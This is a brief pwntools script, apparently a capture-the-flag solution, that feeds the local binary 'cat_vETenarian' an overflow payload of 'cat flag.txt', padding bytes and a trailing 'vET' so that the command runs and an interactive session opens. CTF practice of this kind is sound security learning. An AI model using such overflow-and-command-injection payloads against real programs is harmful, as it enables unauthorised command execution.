from pwn import *

context.binary = elf = ELF('./cat_vETenarian')
io = elf.process()
#context.log_level = 'debug'

payload = b'cat ' + b'flag.txt ' + b'A' * 99 + b'vET'

io.recvuntil('> ')
io.sendline(payload)
io.interactive()
